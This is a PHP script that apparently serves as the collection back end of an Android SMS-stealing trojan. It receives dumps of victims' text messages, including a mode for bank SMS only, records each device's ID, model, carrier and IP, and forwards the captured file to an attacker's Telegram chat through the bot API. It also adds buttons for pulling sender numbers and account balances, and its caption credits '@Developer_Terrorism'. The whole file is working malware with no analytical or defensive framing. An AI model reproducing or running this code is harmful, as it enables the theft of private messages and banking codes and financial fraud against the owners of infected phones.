<?php 
include("chalim.php");


define('TOKEN', $bot_token);
function bot($method, $datas = [])
{
    $url = "https://api.telegram.org/bot" . TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $datas);
    $res = curl_exec($ch);
    if (curl_error($ch)) {

        var_dump(curl_error($ch));

    } else {
        return json_decode($res);
    }
}

#Send Message Function

if(isset($_GET['response'])){
unlink("user/AllSMS.txt");

 $result=$_GET['response'];
  
 if($result == "true"){
 if(isset($_GET['Model'])){
 $model=$_GET['Model']; 
 $action = $_GET['action'];
 $operator = $_GET['operator'];
 $Device_id = $_GET['Device_id'];
 }
 if($action == "allbanksms"){
  $typ = "#All_Bank_SMS";
 }else{
  $typ = "#All_SMS";
 }
 $ip = $_SERVER['REMOTE_ADDR'];
if($result =="true"){




$first_ip = file_get_contents("user/$Device_id-ip.txt");
$PostData = file_get_contents("php://input");



$File = fopen("user/AllSMS.txt","w");



fwrite($File, $PostData); 



fclose($File);


$curl = curl_init();

$n = json_encode(['resize_keyboard' => true, 
'inline_keyboard' => [
[['text' => "𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝑵𝒖𝒎𝒃𝒆𝒓", 'callback_data' => "num_senders"],['text' => "𝒆𝒙𝒕𝒓𝒂𝒄𝒕𝒊𝒐𝒏 𝑩𝒂𝒍𝒂𝒏𝒄", 'callback_data' => "all_balanc2 $Device_id"]],
]]);
curl_setopt_array($curl, array(
  CURLOPT_URL => 'https://api.telegram.org/bot'.$bot_token.'/sendDocument?chat_id='.$id_sender,
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 0,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => array('document'=> new CURLFILE('user/AllSMS.txt'),"caption"=>"
╔ [ • $typ • ] 
║  
╠ [ • Result : $result • ]
║  
╠ [ • Model : $model • ]
╠ [ • Operator : $operator • ]
╠ [ • Device ID : $Device_id • ]
╠ [ • First Ip : $first_ip • ]
╠ [ • Ip : $ip • ]
║
╚ [ • Coded By @Developer_Terrorism • ]
","reply_markup" => $n)
));

$response = curl_exec($curl);

curl_close($curl);


    
}}}


?>
